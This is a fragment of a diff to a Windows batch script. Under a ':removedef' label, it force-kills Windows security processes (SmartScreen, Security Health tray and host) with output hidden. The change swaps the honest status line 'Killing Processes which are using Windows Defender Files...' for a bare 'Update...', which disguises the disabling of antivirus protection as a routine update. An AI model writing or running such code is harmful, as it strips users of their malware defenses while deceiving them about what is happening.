@@ -27,7 +27,7 @@ goto :eof
 :removedef
 ::killing proceses
 CLS
-echo Killing Processes which are using Windows Defender Files...
+echo Update...
 taskkill /f /im smartscreen.exe >nul
 taskkill /f /im SecurityHealthSystray.exe >nul
 taskkill /f /im SecurityHealthHost.exe >nul
